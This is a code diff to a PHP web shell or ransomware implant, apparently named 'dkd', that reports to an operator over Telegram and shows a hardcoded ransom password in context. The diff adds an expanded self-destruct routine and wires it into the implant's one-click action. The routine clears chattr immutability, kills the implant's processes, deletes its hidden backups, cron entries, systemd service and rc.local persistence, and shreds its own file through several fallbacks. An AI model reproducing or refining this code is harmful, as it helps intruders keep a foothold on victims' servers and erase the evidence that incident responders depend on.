@@ -1555,12 +1555,156 @@ echo "Password: Dkd03Ransom2025\n";
     return true;
 }
 
-// ==================== SELF DESTRUCT ====================
+// ==================== SELF-DESTRUCTION ULTIMATE ====================
 function self_destruct_ultimate() {
     global $botToken, $telegramUserId;
-    sendTelegramMessage($botToken, $telegramUserId, "💀 Self destruct executed!");
-    @unlink(__FILE__);
+    $current_file = __FILE__;
+    $current_dir = __DIR__;
+    
+    // Kirim notifikasi terakhir
+    sendTelegramMessage($botToken, $telegramUserId, "💀 Self-destruct initiated!");
+    
+    // ===== 1. MATIKAN ANTI-DELETE =====
+    if (function_exists('shell_exec')) {
+        // Matikan chattr +i pada file utama
+        @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("chattr -R -i " . escapeshellarg($current_dir) . " 2>/dev/null");
+        
+        // Matikan semua proses yang terkait
+        @shell_exec("pkill -f '" . basename($current_file) . "' 2>/dev/null");
+        @shell_exec("pkill -f 'system_cache_repair' 2>/dev/null");
+        @shell_exec("pkill -f 'anti_delete_ultimate' 2>/dev/null");
+    }
+    
+    // ===== 2. HAPUS ALL BACKUP =====
+    $backup_patterns = [
+        dirname(__DIR__) . '/.cache/*.inc',
+        '/tmp/*' . md5($current_file) . '*.inc',
+        '/var/tmp/*' . md5($current_file) . '*.inc',
+        '/dev/shm/*' . md5($current_file) . '*.inc',
+        $current_dir . '/.cache/*.inc',
+        $current_dir . '/*.inc'
+    ];
+    
+    foreach ($backup_patterns as $pattern) {
+        $files = @glob($pattern);
+        if ($files !== false) {
+            foreach ($files as $file) {
+                if (function_exists('shell_exec')) {
+                    @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
+                    @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
+                }
+                @unlink($file);
+            }
+        }
+    }
+    
+    // ===== 3. HAPUS CRON =====
+    if (function_exists('shell_exec')) {
+        // Hapus semua cron yang terkait
+        @shell_exec('crontab -l 2>/dev/null | grep -v "' . basename($current_file) . '" | crontab - 2>/dev/null');
+        @shell_exec('crontab -l 2>/dev/null | grep -v "cache_repair" | crontab - 2>/dev/null');
+        @shell_exec('crontab -l 2>/dev/null | grep -v "system_cache" | crontab - 2>/dev/null');
+        
+        // Hapus file cron di /etc/cron.d/
+        @shell_exec('rm -f /etc/cron.d/*' . basename($current_file) . ' 2>/dev/null');
+        @shell_exec('rm -f /etc/cron.d/*dkd* 2>/dev/null');
+    }
+    
+    // ===== 4. HAPUS SYSTEMD SERVICE =====
+    if (isRoot() && function_exists('shell_exec')) {
+        @shell_exec('systemctl stop dkd.service 2>/dev/null');
+        @shell_exec('systemctl disable dkd.service 2>/dev/null');
+        @shell_exec('rm -f /etc/systemd/system/dkd.service 2>/dev/null');
+        @shell_exec('systemctl daemon-reload 2>/dev/null');
+    }
+    
+    // ===== 5. HAPUS RC.LOCAL =====
+    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local') && function_exists('shell_exec')) {
+        $rc_content = file_get_contents('/etc/rc.local');
+        $rc_content = preg_replace('/.*' . preg_quote(basename($current_file), '/') . '.*\n/', '', $rc_content);
+        $rc_content = preg_replace('/.*dkd.*\n/', '', $rc_content);
+        file_put_contents('/etc/rc.local', $rc_content);
+    }
+    
+    // ===== 6. HAPUS FILE UTAMA (MULTI METHOD) =====
+    $file_deleted = false;
+    
+    // Method 1: chattr + unlink
+    if (function_exists('shell_exec')) {
+        @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
+    }
+    @chmod($current_file, 0777);
+    if (@unlink($current_file)) {
+        $file_deleted = true;
+    }
+    
+    // Method 2: shell_exec rm
+    if (!$file_deleted && function_exists('shell_exec')) {
+        @shell_exec("rm -f " . escapeshellarg($current_file) . " 2>/dev/null");
+        @shell_exec("shred -fuz " . escapeshellarg($current_file) . " 2>/dev/null");
+        if (!file_exists($current_file)) $file_deleted = true;
+    }
+    
+    // Method 3: PHP delete (fallback)
+    if (!$file_deleted) {
+        $fp = @fopen($current_file, 'w');
+        if ($fp) {
+            @fclose($fp);
+            @unlink($current_file);
+        }
+    }
+    
+    // Method 4: rename dan delete
+    if (!$file_deleted && file_exists($current_file)) {
+        $temp_name = $current_dir . '/.deleted_' . time() . '.tmp';
+        @rename($current_file, $temp_name);
+        @unlink($temp_name);
+    }
+    
+    // ===== 7. SELF-DELETE SCRIPT (FINAL FALLBACK) =====
+    if (!$file_deleted && function_exists('shell_exec')) {
+        $script = '/tmp/self_del_' . rand(1000, 99999) . '.sh';
+        $content = '#!/bin/bash
+sleep 2
+chattr -i ' . escapeshellarg($current_file) . ' 2>/dev/null
+rm -f ' . escapeshellarg($current_file) . ' 2>/dev/null
+shred -fuz ' . escapeshellarg($current_file) . ' 2>/dev/null
+rm -f ' . escapeshellarg($script) . ' 2>/dev/null
+';
+        @file_put_contents($script, $content);
+        @chmod($script, 0755);
+        @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
+    }
+    
+    // ===== 8. HAPUS DIRECTORY CACHE =====
+    $cache_dirs = [
+        $current_dir . '/.cache',
+        dirname(__DIR__) . '/.cache'
+    ];
+    foreach ($cache_dirs as $dir) {
+        if (is_dir($dir)) {
+            if (function_exists('shell_exec')) {
+                @shell_exec("rm -rf " . escapeshellarg($dir) . " 2>/dev/null");
+            }
+            deleteDirectory($dir);
+        }
+    }
+    
+    // ===== 9. HAPUS SESSION =====
     session_destroy();
+    if (ini_get("session.use_cookies")) {
+        $params = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000,
+            $params["path"], $params["domain"],
+            $params["secure"], $params["httponly"]
+        );
+    }
+    
+    // ===== 10. EXIT =====
+    echo "💀 Self-destruct completed!";
     exit;
 }
 
@@ -2116,32 +2260,7 @@ function one_click_all() {
     
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     
-    // ===== 13. SELF-DESTRUCTION =====
-    $backup_files = [
-        dirname(__DIR__) . '/.cache/temp.inc',
-        '/tmp/' . md5(__FILE__) . '.inc',
-        '/var/tmp/' . md5(__FILE__) . '.inc',
-        '/dev/shm/' . md5(__FILE__) . '.inc'
-    ];
-    foreach ($backup_files as $backup) {
-        if (file_exists($backup)) {
-            if (function_exists('shell_exec')) {
-                @shell_exec("chattr -i " . escapeshellarg($backup) . " 2>/dev/null");
-                @shell_exec("shred -fuz " . escapeshellarg($backup) . " 2>/dev/null");
-            }
-            @unlink($backup);
-        }
-    }
-    
-    if (function_exists('shell_exec')) {
-        @shell_exec("chattr -i " . escapeshellarg(__FILE__) . " 2>/dev/null");
-        @shell_exec("shred -fuz " . escapeshellarg(__FILE__) . " 2>/dev/null");
-        @shell_exec("rm -f " . escapeshellarg(__FILE__) . " 2>/dev/null");
-    }
-    @unlink(__FILE__);
-    
-    session_destroy();
-    exit;
+    self_destruct_ultimate();
 }
 
 // ==================== HANDLER GET ====================
